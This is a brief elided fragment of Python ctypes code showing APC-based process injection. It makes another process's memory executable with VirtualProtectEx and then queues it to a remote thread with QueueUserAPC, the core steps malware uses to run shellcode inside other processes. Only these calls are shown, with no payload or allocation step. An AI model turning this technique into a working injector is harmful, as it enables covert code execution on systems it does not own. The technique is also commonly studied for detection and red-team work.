...
old_proection = wintypes.DWORD(0)

protect = VirtualProtectEx(h_process, remote_memory, len(buf), PAGE_EXECUTE_READ, byref(old_proection))
...
Requeue = QueueUserAPC(PAPCFUNC(remote_memory), h_thread, None)
